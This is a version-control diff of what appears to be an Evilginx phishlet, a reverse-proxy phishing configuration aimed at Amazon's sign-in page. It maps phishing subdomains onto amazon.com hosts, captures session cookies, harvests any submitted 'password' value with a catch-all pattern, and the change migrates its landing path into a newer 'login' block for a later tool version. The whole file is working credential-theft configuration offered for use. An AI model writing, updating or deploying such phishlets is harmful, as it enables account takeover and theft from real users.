@@ -1,5 +1,5 @@
 author: '@customsync'
-min_ver: '2.2.0'
+min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'amazon.com', session: true, is_landing: true}
   - {phish_sub: 'fls-na', orig_sub: 'fls-na', domain: 'amazon.com', session: false, is_landing: false}
@@ -23,5 +23,6 @@ credentials:
     key: 'password'
     search: '(.*)'
     type: 'post'
-landing_path:
-  - '/ap/signin?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0'
+login:
+  domain: 'www.amazon.com'
+  path: '/ap/signin?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0'
